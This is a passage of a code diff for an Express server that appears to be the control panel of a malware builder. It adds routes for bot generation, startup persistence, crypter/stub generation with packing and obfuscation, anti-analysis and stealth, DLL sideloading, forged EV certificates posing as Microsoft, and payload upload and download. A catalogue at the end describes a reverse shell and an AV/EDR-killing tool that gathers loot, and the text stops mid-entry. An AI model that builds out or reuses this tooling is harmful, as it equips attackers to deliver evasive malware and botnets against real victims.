+                engineStatuses[engineName] = await engine.getStatus();
+    } catch (error) {
+                engineStatuses[engineName] = { status: 'error', error: error.message };
+            }
+        }
+        res.json({ success: true, engines: engineStatuses });
+    } catch (e) {
+    res.status(500).json({ success: false, error: e.message });
+  }
+});
+
+// Individual Engine Endpoints
+Object.keys(realModules).forEach(engineName => {
+    const engine = realModules[engineName];
+    
+    // Status endpoint for each engine
+    app.get(`/api/${engineName}/status`, requireAuth, async (req, res) => {
+        try {
+            const status = await engine.getStatus();
+    res.json({ success: true, result: status });
+  } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+    // Initialize endpoint for each engine
+    app.post(`/api/${engineName}/initialize`, requireAuth, async (req, res) => {
+    try {
+            const result = await engine.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+});
+
+// Specific Engine API Endpoints
+app.get('/api/persistence/methods', requireAuth, async (_req, res) => {
+    try {
+        const methods = await realModules.startupPersistence.getAvailableMethods();
+        res.json({ success: true, methods, available: methods.length });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+app.post('/api/persistence/install', requireAuth, async (req, res) => {
+    try {
+        const { targetPath, method, options } = req.body;
+        if (!targetPath || !method) {
+            return res.status(400).json({ success: false, error: 'targetPath and method are required' });
+        }
+        const result = await realModules.startupPersistence.installPersistence(targetPath, method, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// Bot Generation Endpoints
+app.post('/api/bots/http/generate', requireAuth, async (req, res) => {
+    try {
+        const { config = {}, features = [], extensions = [] } = req.body || {};
+        const result = await realModules.httpBotGenerator.generateBot({ config, features, extensions });
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/stub-generator/templates', requireAuth, async (req, res) => {
+app.post('/api/bots/irc/generate', requireAuth, async (req, res) => {
     try {
-        const result = ['basic', 'advanced', 'stealth', 'polymorphic'];
+        const { config = {}, features = [], extensions = [] } = req.body || {};
+        const result = await realModules.ircBotGenerator.generateBot({ config, features, extensions });
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/stub-generator/active', requireAuth, async (req, res) => {
+// Analysis Endpoints
+app.post('/api/analysis/malware', requireAuth, async (req, res) => {
     try {
-        const result = [];
+        const { file = 'server.js' } = req.body || {};
+        const result = await realModules.malwareAnalysis.analyzeFile(file, { type: 'full' });
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/stub-generator/packing-methods', requireAuth, async (req, res) => {
+app.post('/api/analysis/forensics', requireAuth, async (req, res) => {
     try {
-        const result = ['upx', 'mew', 'fsg', 'pecompact', 'aspack'];
+        const { target = '.', type = 'full' } = req.body || {};
+        const result = await realModules.digitalForensics.analyzeFileSystem(target, { type });
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/stub-generator/fud-techniques', requireAuth, async (req, res) => {
+// Crypto Endpoints
+app.post('/api/crypto/encrypt', requireAuth, async (req, res) => {
     try {
-        const result = ['polymorphic', 'obfuscation', 'encryption', 'anti-analysis'];
+        const { data, algorithm = 'aes-256-cbc', key, iv } = req.body || {};
+        const result = await realModules.advancedCrypto.encrypt(data, { algorithm, key, iv });
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/stub-generator/auto-regeneration/status', requireAuth, async (req, res) => {
+app.post('/api/crypto/decrypt', requireAuth, async (req, res) => {
     try {
-        const result = { enabled: false, threshold: 0, delay: 0 };
+        const { encryptedData, algorithm = 'aes-256-cbc', key, iv } = req.body || {};
+        const result = await realModules.advancedCrypto.decrypt(encryptedData, { algorithm, key, iv });
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/stub-generator/unpacked', requireAuth, async (req, res) => {
+// Stub Generation Endpoints
+app.post('/api/stubs/generate', requireAuth, async (req, res) => {
     try {
-        const result = [];
+        const { 
+            templateId, 
+            language, 
+            platform, 
+            encryptionMethods, 
+            packingMethod, 
+            obfuscationLevel, 
+            customFeatures, 
+            serverUrl,
+            // New payload input options
+            payloadType = 'generate', // 'generate', 'user', 'url'
+            payloadId = null,
+            payloadUrl = null,
+            userPayload = null
+        } = req.body || {};
+        
+        let targetPayload = 'default-payload';
+        
+        // Handle different payload input types
+        if (payloadType === 'user' && payloadId) {
+            const userId = req.headers['x-user-id'] || 'anonymous';
+            const userPayloadList = userPayloads.get(userId) || [];
+            const payload = userPayloadList.find(p => p.id === payloadId);
+            if (payload) {
+                targetPayload = payload.content.toString('utf8');
+            }
+        } else if (payloadType === 'url' && payloadUrl) {
+            // Download from URL
+            const https = require('https');
+            const http = require('http');
+            const urlModule = require('url');
+            
+            const parsedUrl = urlModule.parse(payloadUrl);
+            const client = parsedUrl.protocol === 'https:' ? https : http;
+            
+            const downloadPromise = new Promise((resolve, reject) => {
+                client.get(payloadUrl, (response) => {
+                    if (response.statusCode !== 200) {
+                        reject(new Error(`HTTP ${response.statusCode}`));
+                        return;
+                    }
+                    
+                    const chunks = [];
+                    response.on('data', chunk => chunks.push(chunk));
+                    response.on('end', () => resolve(Buffer.concat(chunks)));
+                    response.on('error', reject);
+                }).on('error', reject);
+            });
+            
+            const urlContent = await downloadPromise;
+            targetPayload = urlContent.toString('utf8');
+        } else if (payloadType === 'direct' && userPayload) {
+            targetPayload = userPayload;
+        }
+        
+        const result = await realModules.stubGenerator.generateStub(targetPayload, {
+            templateId,
+            language,
+            platform,
+            encryptionMethods,
+            packingMethod,
+            obfuscationLevel,
+            customFeatures,
+            serverUrl
+        });
+            res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// CVE Analysis Endpoints
+app.post('/api/cve/analyze', requireAuth, async (req, res) => {
+    try {
+        const { cveId } = req.body || {};
+        if (!cveId) {
+            return res.status(400).json({ error: 'CVE ID is required' });
+        }
+        const result = await realModules.cveAnalysisEngine.analyzeCVE(cveId);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/stub-generator/repack-history', requireAuth, async (req, res) => {
+app.post('/api/cve/search', requireAuth, async (req, res) => {
     try {
-        const result = [];
+        const { query, options = {} } = req.body || {};
+        if (!query) {
+            return res.status(400).json({ error: 'Search query is required' });
+        }
+        const result = await realModules.cveAnalysisEngine.searchCVEs(query, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/stub-generator/comprehensive-stats', requireAuth, async (req, res) => {
+// Hot Patching Endpoints
+app.post('/api/hot-patch/apply', requireAuth, async (req, res) => {
     try {
-        const result = { total: 0, active: 0, generated: 0, packed: 0 };
+        const { target, patchType, options = {} } = req.body || {};
+        if (!target || !patchType) {
+            return res.status(400).json({ error: 'target and patchType are required' });
+        }
+        const result = await realModules.hotPatchers.applyPatch(target, patchType, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/stub-generator/export-stats/:format', requireAuth, async (req, res) => {
+// Revert hot patch
+app.post('/api/hot-patch/revert', requireAuth, async (req, res) => {
     try {
-        const { format } = req.params;
-        const result = { format, exported: true, data: {} };
+        const { patchId } = req.body || {};
+        if (!patchId) {
+            return res.status(400).json({ error: 'patchId is required' });
+        }
+        const result = await realModules.hotPatchers.revertPatch(patchId);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/native-compiler/stats', requireAuth, async (req, res) => {
+// Get active patches
+app.get('/api/hot-patch/active', requireAuth, async (req, res) => {
     try {
-        const result = { compiled: 0, languages: ['c', 'cpp', 'rust'], errors: 0 };
+        const result = await realModules.hotPatchers.getActivePatches();
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/native-compiler/supported-languages', requireAuth, async (req, res) => {
+// Anti-Analysis Endpoints
+app.post('/api/anti-analysis/run', requireAuth, async (req, res) => {
     try {
-        const result = ['c', 'cpp', 'rust', 'go', 'assembly'];
+        const { options = {} } = req.body || {};
+        const result = await realModules.antiAnalysis.runAntiAnalysis(options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/native-compiler/available-compilers', requireAuth, async (req, res) => {
+// Performance Endpoints
+app.post('/api/performance/optimize', requireAuth, async (req, res) => {
     try {
-        const result = ['gcc', 'clang', 'msvc', 'rustc'];
+        const { options = {} } = req.body || {};
+        const result = await realModules.performanceOptimizer.optimizePerformance(options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/jotti/info', requireAuth, async (req, res) => {
+// Memory Management Endpoints
+app.get('/api/memory/stats', requireAuth, async (_req, res) => {
     try {
-        const result = { name: 'Jotti Scanner', engines: 20, status: 'active' };
+        const result = await realModules.memoryManager.getMemoryStats();
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/jotti/test-connection', requireAuth, async (req, res) => {
+// Network Tools Endpoints
+app.get('/api/network/status', requireAuth, async (_req, res) => {
     try {
-        const result = { connected: true, latency: 150, engines: 20 };
+        const result = await realModules.networkTools.getStatus();
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/jotti/active-scans', requireAuth, async (req, res) => {
+// Health Monitor Endpoints
+app.get('/api/health/system', requireAuth, async (_req, res) => {
     try {
-        const result = [];
+        const result = await realModules.healthMonitor.getSystemHealth();
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/jotti/scan-history', requireAuth, async (req, res) => {
+// Camellia Assembly Engine x86/x64 Endpoints
+app.get('/api/camellia/architectures', requireAuth, async (req, res) => {
     try {
-        const result = [];
+        if (!realModules || !realModules.camelliaAssembly) {
+            return res.status(500).json({ error: 'Camellia Assembly Engine module not initialized' });
+        }
+        const architectures = await realModules.camelliaAssembly.getAvailableArchitectures();
+        res.json({ success: true, architectures });
+    } catch (e) {
+        console.error('[ERROR] Camellia architectures failed:', e);
+        if (!res.headersSent) {
+            res.status(500).json({ success: false, error: e.message });
+        }
+    }
+});
+
+app.post('/api/camellia/encrypt-x86', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.camelliaAssembly) {
+            return res.status(500).json({ error: 'Camellia Assembly Engine module not initialized' });
+        }
+        const { data = 'test data', options = {} } = req.body || {};
+        options.architecture = 'x86';
+        const result = await realModules.camelliaAssembly.encrypt(data, options);
+        res.json({ success: true, result, architecture: 'x86' });
+    } catch (e) {
+        console.error('[ERROR] Camellia x86 encryption failed:', e);
+        if (!res.headersSent) {
+            res.status(500).json({ success: false, error: e.message });
+        }
+    }
+});
+
+app.post('/api/camellia/encrypt-x64', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.camelliaAssembly) {
+            return res.status(500).json({ error: 'Camellia Assembly Engine module not initialized' });
+        }
+        const { data = 'test data', options = {} } = req.body || {};
+        options.architecture = 'x64';
+        const result = await realModules.camelliaAssembly.encrypt(data, options);
+        res.json({ success: true, result, architecture: 'x64' });
+    } catch (e) {
+        console.error('[ERROR] Camellia x64 encryption failed:', e);
+        if (!res.headersSent) {
+            res.status(500).json({ success: false, error: e.message });
+        }
+    }
+});
+
+// Dual Generators Endpoints
+app.post('/api/dual-generators/generate', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        const result = await realModules.dualGenerators.generateDual(target, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/jotti/scan-status/:jobId', requireAuth, async (req, res) => {
+// Advanced Stub Generator Endpoints
+app.post('/api/advanced-stub-generator/generate', requireAuth, async (req, res) => {
     try {
-        const { jobId } = req.params;
-        const result = { jobId, status: 'completed', results: [] };
+        const { options = {} } = req.body || {};
+        const result = await realModules.advancedStubGenerator.generateStub(options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/private-scanner/queue-status', requireAuth, async (req, res) => {
+// Advanced Crypto Endpoints
+app.post('/api/advanced-crypto/encrypt', requireAuth, async (req, res) => {
     try {
-        const result = { queue: [], active: 0, pending: 0 };
+        const { data, options = {} } = req.body || {};
+        if (!data) {
+            return res.status(400).json({ error: 'data is required' });
+        }
+        const result = await realModules.advancedCrypto.encrypt(data, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/private-scanner/engines', requireAuth, async (req, res) => {
+// Compression Engine Endpoints
+app.post('/api/compression/compress', requireAuth, async (req, res) => {
     try {
-        const result = { engines: ['defender', 'clamav'], status: 'active' };
+        const { data, options = {} } = req.body || {};
+        if (!data) {
+            return res.status(400).json({ error: 'data is required' });
+        }
+        const result = await realModules.compressionEngine.compress(data, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/private-scanner/stats', requireAuth, async (req, res) => {
+// Stealth Engine Endpoints
+app.post('/api/stealth/apply', requireAuth, async (req, res) => {
     try {
-        const result = { scanned: 0, detected: 0, clean: 0 };
+        const { data, options = {} } = req.body || {};
+        if (!data) {
+            return res.status(400).json({ error: 'data is required' });
+        }
+        const result = await realModules.stealthEngine.applyStealth(data, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/private-scanner/result/:scanId', requireAuth, async (req, res) => {
+// Payload Management System
+const fs = require('fs').promises;
+
+// Configure multer for file uploads
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        const uploadDir = path.join(__dirname, 'uploads', 'payloads');
+        fs.mkdir(uploadDir, { recursive: true }).then(() => {
+            cb(null, uploadDir);
+        }).catch(cb);
+    },
+    filename: (req, file, cb) => {
+        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
+        cb(null, `${file.fieldname}-${uniqueSuffix}${path.extname(file.originalname)}`);
+    }
+});
+
+const upload = multer({ 
+    storage: storage,
+    limits: { fileSize: 50 * 1024 * 1024 }, // 50MB limit
+    fileFilter: (req, file, cb) => {
+        // Allow common payload file types
+        const allowedTypes = [
+            '.exe', '.dll', '.so', '.dylib', '.bin', '.dat',
+            '.cpp', '.cs', '.py', '.js', '.ps1', '.bat', '.sh',
+            '.asm', '.obj', '.o', '.a', '.lib'
+        ];
+        const ext = path.extname(file.originalname).toLowerCase();
+        if (allowedTypes.includes(ext)) {
+            cb(null, true);
+        } else {
+            cb(new Error(`File type ${ext} not allowed`), false);
+        }
+    }
+});
+
+// User Payload Storage
+const userPayloads = new Map(); // userId -> payloads array
+
+// Payload Download/Upload Endpoints
+app.get('/api/payloads/download/:engine/:payloadId', requireAuth, async (req, res) => {
     try {
-        const { scanId } = req.params;
-        const result = { scanId, status: 'completed', threats: [] };
+        const { engine, payloadId } = req.params;
+        const { format = 'raw' } = req.query;
+        
+        if (!realModules[engine]) {
+            return res.status(404).json({ error: 'Engine not found' });
+        }
+        
+        // Get payload from engine
+        const payload = await realModules[engine].getPayload(payloadId);
+        if (!payload) {
+            return res.status(404).json({ error: 'Payload not found' });
+        }
+        
+        // Set appropriate headers based on format
+        const contentType = getContentType(format);
+        res.setHeader('Content-Type', contentType);
+        res.setHeader('Content-Disposition', `attachment; filename="${payloadId}.${format}"`);
+        
+        res.send(payload.data);
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Upload local file payload
+app.post('/api/payloads/upload-file', requireAuth, upload.single('payload'), async (req, res) => {
+    try {
+        if (!req.file) {
+            return res.status(400).json({ error: 'No file uploaded' });
+        }
+        
+        const userId = req.headers['x-user-id'] || 'anonymous';
+        const payloadId = `user_${userId}_${Date.now()}`;
+        
+        // Read file content
+        const fileContent = await fs.readFile(req.file.path);
+        
+        // Store payload info
+        const payloadInfo = {
+            id: payloadId,
+            userId: userId,
+            filename: req.file.originalname,
+            path: req.file.path,
+            size: req.file.size,
+            mimetype: req.file.mimetype,
+            uploadedAt: new Date(),
+            content: fileContent
+        };
+        
+        // Store in user's payload collection
+        if (!userPayloads.has(userId)) {
+            userPayloads.set(userId, []);
+        }
+        userPayloads.get(userId).push(payloadInfo);
+        
+        res.json({ 
+            success: true, 
+            payloadId: payloadId,
+            filename: req.file.originalname,
+            size: req.file.size,
+            message: 'File uploaded successfully'
+        });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Upload payload from URL
+app.post('/api/payloads/upload-url', requireAuth, async (req, res) => {
+    try {
+        const { url, filename, options = {} } = req.body || {};
+        
+        if (!url) {
+            return res.status(400).json({ error: 'URL is required' });
+        }
+        
+        const userId = req.headers['x-user-id'] || 'anonymous';
+        const payloadId = `url_${userId}_${Date.now()}`;
+        
+        // Download file from URL
+        
+        const parsedUrl = urlModule.parse(url);
+        const client = parsedUrl.protocol === 'https:' ? https : http;
+        
+        const downloadPromise = new Promise((resolve, reject) => {
+            client.get(url, (response) => {
+                if (response.statusCode !== 200) {
+                    reject(new Error(`HTTP ${response.statusCode}`));
+                    return;
+                }
+                
+                const chunks = [];
+                response.on('data', chunk => chunks.push(chunk));
+                response.on('end', () => resolve(Buffer.concat(chunks)));
+                response.on('error', reject);
+            }).on('error', reject);
+        });
+        
+        const fileContent = await downloadPromise;
+        
+        // Store payload info
+        const payloadInfo = {
+            id: payloadId,
+            userId: userId,
+            filename: filename || path.basename(parsedUrl.pathname) || 'downloaded_file',
+            url: url,
+            size: fileContent.length,
+            uploadedAt: new Date(),
+            content: fileContent
+        };
+        
+        // Store in user's payload collection
+        if (!userPayloads.has(userId)) {
+            userPayloads.set(userId, []);
+        }
+        userPayloads.get(userId).push(payloadInfo);
+        
+        res.json({ 
+            success: true, 
+            payloadId: payloadId,
+            filename: payloadInfo.filename,
+            size: fileContent.length,
+            message: 'File downloaded and stored successfully'
+        });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Get user's payloads
+app.get('/api/payloads/user-payloads', requireAuth, async (req, res) => {
+    try {
+        const userId = req.headers['x-user-id'] || 'anonymous';
+        const userPayloadList = userPayloads.get(userId) || [];
+        
+        // Return payload info without content
+        const payloadList = userPayloadList.map(payload => ({
+            id: payload.id,
+            filename: payload.filename,
+            size: payload.size,
+            uploadedAt: payload.uploadedAt,
+            type: payload.url ? 'url' : 'file'
+        }));
+        
+        res.json({ success: true, payloads: payloadList });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Get specific user payload
+app.get('/api/payloads/user-payload/:payloadId', requireAuth, async (req, res) => {
+    try {
+        const { payloadId } = req.params;
+        const userId = req.headers['x-user-id'] || 'anonymous';
+        
+        const userPayloadList = userPayloads.get(userId) || [];
+        const payload = userPayloadList.find(p => p.id === payloadId);
+        
+        if (!payload) {
+            return res.status(404).json({ error: 'Payload not found' });
+        }
+        
+        // Set appropriate headers
+        const ext = path.extname(payload.filename).toLowerCase();
+        const contentType = getContentType(ext.substring(1)) || 'application/octet-stream';
+        
+        res.setHeader('Content-Type', contentType);
+        res.setHeader('Content-Disposition', `attachment; filename="${payload.filename}"`);
+        res.send(payload.content);
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Process payload with engine
+app.post('/api/payloads/process/:engine', requireAuth, async (req, res) => {
+    try {
+        const { engine } = req.params;
+        const { payloadId, payloadType = 'user', options = {} } = req.body || {};
+        
+        if (!realModules[engine]) {
+            return res.status(404).json({ error: 'Engine not found' });
+        }
+        
+        let payloadData = null;
+        
+        if (payloadType === 'user' && payloadId) {
+            // Get user's payload
+            const userId = req.headers['x-user-id'] || 'anonymous';
+            const userPayloadList = userPayloads.get(userId) || [];
+            const payload = userPayloadList.find(p => p.id === payloadId);
+            
+            if (!payload) {
+                return res.status(404).json({ error: 'User payload not found' });
+            }
+            
+            payloadData = payload.content;
+        } else if (payloadType === 'url' && req.body.url) {
+            // Download from URL
+            
+            const parsedUrl = urlModule.parse(req.body.url);
+            const client = parsedUrl.protocol === 'https:' ? https : http;
+            
+            const downloadPromise = new Promise((resolve, reject) => {
+                client.get(req.body.url, (response) => {
+                    if (response.statusCode !== 200) {
+                        reject(new Error(`HTTP ${response.statusCode}`));
+                        return;
+                    }
+                    
+                    const chunks = [];
+                    response.on('data', chunk => chunks.push(chunk));
+                    response.on('end', () => resolve(Buffer.concat(chunks)));
+                    response.on('error', reject);
+                }).on('error', reject);
+            });
+            
+            payloadData = await downloadPromise;
+        } else if (payloadType === 'generate') {
+            // Generate new payload
+            payloadData = Buffer.from('Generated payload ${config.server.baseUrl}', 'utf8');
+        } else {
+            return res.status(400).json({ error: 'Invalid payload type or missing payloadId/url' });
+        }
+        
+        // Process payload with engine
+        const result = await realModules[engine].processPayload(payloadData, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/private-scanner/history', requireAuth, async (req, res) => {
+// IRC Bot Generator Endpoints
+app.post('/api/irc-bot/generate', requireAuth, async (req, res) => {
     try {
-        const result = [];
+        const { config = {}, features = [], extensions = [], encryptionOptions = {} } = req.body || {};
+        const result = await realModules.ircBotGenerator.generateBot(config, features, extensions, encryptionOptions);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/implementation-check/results', requireAuth, async (req, res) => {
+app.post('/api/irc-bot/generate-as-stub', requireAuth, async (req, res) => {
     try {
-        const result = [];
+        const { config = {}, features = [], extensions = [], encryptionOptions = {} } = req.body || {};
+        const result = await realModules.ircBotGenerator.generateBotAsStub(config, features, extensions, encryptionOptions);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-
-
-// Add missing endpoints that are returning 404 errors
-app.post('/stub-generator/generate', requireAuth, async (req, res) => {
+// Multi-Platform Bot Generator Endpoints
+app.post('/api/multi-platform-bot/generate', requireAuth, async (req, res) => {
     try {
-        const { templateId, language, platform, encryptionMethods, packingMethod, obfuscationLevel, customFeatures, serverUrl } = req.body || {};
-        const result = { generated: true, templateId, language, platform, timestamp: new Date().toISOString() };
+        const { platforms = [], options = {} } = req.body || {};
+        if (!platforms.length) {
+            return res.status(400).json({ error: 'platforms array is required' });
+        }
+        const result = await realModules.multiPlatformBotGenerator.generateMultiPlatformBot(platforms, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/stub-generator/regenerate', requireAuth, async (req, res) => {
+// Payload Manager Endpoints
+app.post('/api/payload-manager/create', requireAuth, async (req, res) => {
     try {
-        const { botId = 'test-bot', newOptions = {} } = req.body || {};
-        const result = { regenerated: true, botId, timestamp: new Date().toISOString() };
+        const { options = {} } = req.body || {};
+        const result = await realModules.payloadManager.createPayload(options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/native-compiler/regenerate', requireAuth, async (req, res) => {
+app.post('/api/payload-manager/generate', requireAuth, async (req, res) => {
     try {
-        const { exePath = 'test.exe', options = {} } = req.body || {};
-        const result = { regenerated: true, exePath, timestamp: new Date().toISOString() };
+        const { options = {} } = req.body || {};
+        const result = await realModules.payloadManager.generatePayload(options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/stub-generator/analyze', requireAuth, async (req, res) => {
+// Beaconism DLL Sideloading Endpoints
+app.post('/api/beaconism/generate-sideloading', requireAuth, async (req, res) => {
     try {
-        const { stubData = 'test stub data' } = req.body || {};
-        const result = { analyzed: true, stubData: 'analyzed', timestamp: new Date().toISOString() };
+        const { options = {} } = req.body || {};
+        const result = await realModules.beaconismDLL.generateSideloadingPayload(options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/jotti/scan', requireAuth, async (req, res) => {
+app.post('/api/beaconism/create-dll', requireAuth, async (req, res) => {
     try {
-        const { filePath = 'test.exe', options = {} } = req.body || {};
-        const result = { scanned: true, filePath, results: [], timestamp: new Date().toISOString() };
+        const { options = {} } = req.body || {};
+        const result = await realModules.beaconismDLL.createDLLPayload(options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/jotti/scan-multiple', requireAuth, async (req, res) => {
+// Hot Patchers Endpoints
+app.post('/api/hot-patchers/generate-patch', requireAuth, async (req, res) => {
     try {
-        const { filePaths = ['test1.exe', 'test2.exe'], options = {} } = req.body || {};
-        const result = { scanned: true, filePaths, results: [], timestamp: new Date().toISOString() };
+        const { target, patchType, options = {} } = req.body || {};
+        if (!target || !patchType) {
+            return res.status(400).json({ error: 'target and patchType are required' });
+        }
+        const result = await realModules.hotPatchers.generatePatch(target, patchType, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/jotti/cancel-scan', requireAuth, async (req, res) => {
+// EV Cert Encryptor Endpoints
+app.post('/api/ev-cert/generate-certificate', requireAuth, async (req, res) => {
     try {
-        const { jobId = 'test-job-id' } = req.body || {};
-        const result = { cancelled: true, jobId, timestamp: new Date().toISOString() };
+        const { templateName = 'Microsoft Corporation', customOptions = {} } = req.body || {};
+        const result = await realModules.evCertEncryptor.generateEVCertificate(templateName, customOptions);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/private-scanner/scan', requireAuth, async (req, res) => {
+app.post('/api/ev-cert/encrypt-stub', requireAuth, async (req, res) => {
     try {
-        const { filePath = 'test.exe', options = {} } = req.body || {};
-        const result = { scanned: true, filePath, results: [], timestamp: new Date().toISOString() };
+        const { stubCode, language, certId, options = {} } = req.body || {};
+        if (!stubCode || !language || !certId) {
+            return res.status(400).json({ error: 'stubCode, language, and certId are required' });
+        }
+        const result = await realModules.evCertEncryptor.encryptStubWithEVCert(stubCode, language, certId, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/private-scanner/queue', requireAuth, async (req, res) => {
+// Advanced Crypto Endpoints
+app.post('/api/advanced-crypto/generate-stub', requireAuth, async (req, res) => {
     try {
-        const { filePath = 'test.exe', options = {} } = req.body || {};
-        const result = { queued: true, filePath, scanId: 'scan-' + Date.now(), timestamp: new Date().toISOString() };
+        const { encryptedData, options = {} } = req.body || {};
+        if (!encryptedData) {
+            return res.status(400).json({ error: 'encryptedData is required' });
+        }
+        const result = await realModules.advancedCrypto.generateStub(encryptedData, options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.get('/stub-generator/encryption-methods', requireAuth, async (req, res) => {
+app.post('/api/advanced-crypto/stub-conversion', requireAuth, async (req, res) => {
     try {
-        const result = ['aes-256', 'serpent', 'twofish', 'camellia', 'chacha20', 'blowfish', 'rc6', 'mars', 'rijndael'];
+        const { options = {} } = req.body || {};
+        const result = await realModules.advancedCrypto.generateStubConversion(options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/stub-generator/trigger-regeneration', requireAuth, async (req, res) => {
+// Camellia Assembly Engine Endpoints
+app.post('/api/camellia/generate-stub', requireAuth, async (req, res) => {
     try {
-        const { botId = 'test-bot', reason = 'manual trigger' } = req.body || {};
-        const result = { triggered: true, botId, reason, timestamp: new Date().toISOString() };
+        const { options = {} } = req.body || {};
+        const result = await realModules.camelliaAssembly.generateStub(options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/stub-generator/unpack', requireAuth, async (req, res) => {
-    try {
-        const { stubData = 'test stub data', packingMethod = 'upx', options = {} } = req.body || {};
-        const result = { unpacked: true, stubData: 'unpacked', packingMethod, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
+// RawrZ Custom Payloads and Features
+const rawrzCustomPayloads = {
+    'redshell': {
+        name: 'Red Shell',
+        description: 'Advanced reverse shell with multiple connection methods',
+        category: 'shell',
+        features: [
+            'powershell-shell', 'cmd-shell', 'bash-shell', 'python-shell', 'node-shell',
+            'encrypted-communication', 'anti-detection', 'persistence', 'multi-platform'
+        ],
+        languages: ['cpp', 'csharp', 'python', 'javascript', 'powershell'],
+        architectures: ['x86', 'x64'],
+        integration: 'red-shells'
+    },
+    'red-killer': {
+        name: 'Red Killer',
+        description: 'AV/EDR detection and termination system',
+        category: 'evasion',
+        features: [
+            'av-detection', 'edr-detection', 'process-termination', 'service-stopping',
+            'data-extraction', 'wifi-dump', 'loot-management', 'stealth-mode'
+        ],
+        languages: ['cpp', 'csharp', 'python', 'powershell'],
+        architectures: ['x86', 'x64'],
+        integration: 'red-killer'
+    },
+    'ev-cert-encryptor': {
+        name: 'EV Certificate Encryptor',
+        description: 'Encrypt payloads with legitimate EV certificates',
+        category: 'encryption',
+        features: [
+            'ev-certificate-generation', 'multi-language-stubs', 'advanced-encryption',
+            'certificate-authentication', 'stealth-encryption', 'anti-analysis'
+        ],
+        languages: ['csharp', 'cpp', 'python', 'javascript', 'powershell', 'batch'],
+        architectures: ['x86', 'x64'],
+        integration: 'ev-cert-encryptor'
+    },
+    'beaconism-dll': {
+        name: 'Beaconism DLL Sideloading',
+        description: 'DLL sideloading with beacon communication',
